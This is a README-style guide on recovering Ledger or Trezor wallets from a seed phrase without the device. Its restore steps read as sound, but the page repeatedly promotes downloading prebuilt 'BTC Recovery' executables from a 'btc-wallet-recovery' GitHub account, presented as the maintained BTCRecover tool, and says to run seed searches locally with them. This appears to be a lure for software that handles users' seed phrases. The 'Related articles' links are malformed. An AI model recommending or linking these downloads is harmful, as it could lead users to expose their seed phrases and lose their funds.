<div align="center">
<img src="assets/banner-article.png" alt="Ledger and Trezor seed recovery without the device">
</div>

# Ledger and Trezor seed recovery without the device

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A hardware wallet is a copy of a seed, not the seed itself: the phrase restores the same accounts in any compatible wallet, and a lost or broken device never makes the coins unreachable on its own. Recovery means reading the phrase correctly, not repairing the device.

## You'll see this if

The device is gone, damaged or reset, and what remains is a written phrase, a partial phrase, or nothing at all. Each of those is a different situation, and only the last one is terminal.

| What you have | What it means | Where to go |
|---|---|---|
| The full phrase, device gone | restore into a compatible wallet or a replacement device | here |
| The phrase, device reset by a forgotten PIN | same  -  the phrase is the wallet | here |
| The device but not the PIN | the device may wipe on wrong attempts, so stop and use the phrase | here |
| Most of the phrase | a search over the gaps, with an address as target | [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) |
| The phrase plus a passphrase | a hidden wallet sits behind the passphrase | [BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md) |
| A phrase that is rejected | wrong list or wrong word count | [Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md) |
| Nothing at all | unreachable  -  a device cannot be made to reveal its seed | [Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md) |

## Why it happens

A hardware wallet stores the seed and signs with keys derived from it, so the device is a convenience and a security boundary rather than the wallet itself. That is the design that makes a lost device survivable: the phrase regenerates every account, including accounts the device never displayed on screen.

The failure modes are worth naming because they route differently. A forgotten PIN on a device that wipes after a set number of attempts turns a small problem into a phrase problem if you keep guessing  -  the correct move is to stop and use the phrase. A damaged device with an intact phrase is not a recovery at all. A phrase that is one word short is a search. And a passphrase-protected setup hides a second wallet that the phrase alone will not reveal.

One asymmetry trips people up: the phrase restores the accounts, but not the device's settings, labels or the specific account it was displaying. Restoring into a different wallet can look wrong for a minute, because the first receiving address differs until the right account index is chosen.

## Fix

Read the phrase first, then restore  -  and never attempt to repair, guess or bypass a device to get at its seed.

1. **Stop using the device if the PIN is failing.** Most devices wipe after a fixed number of wrong attempts, and that converts a PIN problem into a phrase-only problem.
2. **Read the written phrase carefully**, including case and spelling, and check the word count: 12, 18 or 24 for standard phrases. A word that is not on the list is the first thing to resolve: [Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md).
3. **Restore into a compatible wallet**, hardware or software, choosing the phrase length and any passphrase the setup asks for.
4. **Compare the first receiving address** with a record from before the device was lost. That comparison is the confirmation, not the balance: [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md).
5. **Check for a passphrase** if the balance does not appear with the phrase alone  -  a hidden wallet needs its passphrase: [BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md).
6. **Download the current release from the GitHub releases page** when the phrase is incomplete and a local search is needed: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
7. **Move the balance to a wallet you have restored once**, then store the phrase as carefully as before  -  a recovery is not a reason to relax the storage.

Entering the phrase deserves care of its own. Many devices suggest words as you type, and a hurried entry can accept a neighbour that looks right on a small screen without complaining until the checksum fails at the end. Typing slowly, one word at a time, and re-reading the whole sequence before confirming avoids a failure that then looks like a lost wallet. Where a device offers its own restore from a backup file rather than from words, that path is the shorter one, and the written phrase stays the fallback for the day the backup is unreadable.

## If that did not work

If a restored phrase produces no balance, the phrase is either wrong in a word you trust, or read through the wrong account or passphrase. Test in that order.

A single valid-but-wrong word is the classic case: the phrase passes the checksum, restores a working wallet, and shows nothing. That is indistinguishable from a wrong account until you compare addresses, which is why an address from before the loss is worth more than any memory of a balance. If the device had a passphrase, test the phrase with and without it before anything else.

If the device itself is the only artifact  -  no phrase written anywhere  -  nothing can be extracted from it. Hardware wallets are built so that the seed never leaves the secure element, which is the property that makes them worth using; it also means a device with no backup is an unrecoverable wallet: [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) covers the phrase side, and [Seed phrase storage and the USB-drive question](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/seed-phrase-storage-btcrecover.md) covers how to stop this happening twice.

## Prevention

- Write the phrase at setup and verify a restore before moving funds to the device.
- Never store the phrase digitally, and never enter it into a website or a chat.
- Record whether a passphrase was set, separately from the phrase.
- Keep the phrase in two places; a single card is a single point of failure.
- Treat a failing PIN as a stop signal, not a challenge.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### Can I recover a Ledger or Trezor wallet without the device?

Yes, if the phrase exists: any compatible wallet restores the same accounts from those words. What cannot be recovered is a device with no written phrase, because the seed is designed never to leave it.

### Recover Ledger seed phrase  -  where do I start?

Read the written phrase, confirm the word count and that every word is on the list, then restore it in a compatible wallet and compare the first receiving address with a record. If words are missing, that comparison becomes the target of a local search.

### What happens if I enter the wrong PIN too many times?

Most devices wipe themselves after a set number of failed attempts, deleting the stored seed. If the phrase is written down, that is an inconvenience; if it is not, the wallet is gone  -  so stop guessing before the limit is reached.

### Can a hardware wallet seed be extracted from the device?

No. The seed is held in a secure element that does not export it, which is the whole point of the design. Recovery is always a phrase-side operation, never a device-side extraction.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [BIP39 passphrase and the 25th word]([BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md))
- [Seed phrase storage]([Seed phrase storage and the USB-drive question](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/seed-phrase-storage-btcrecover.md))
- [Restored seed shows an empty wallet]([Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md))
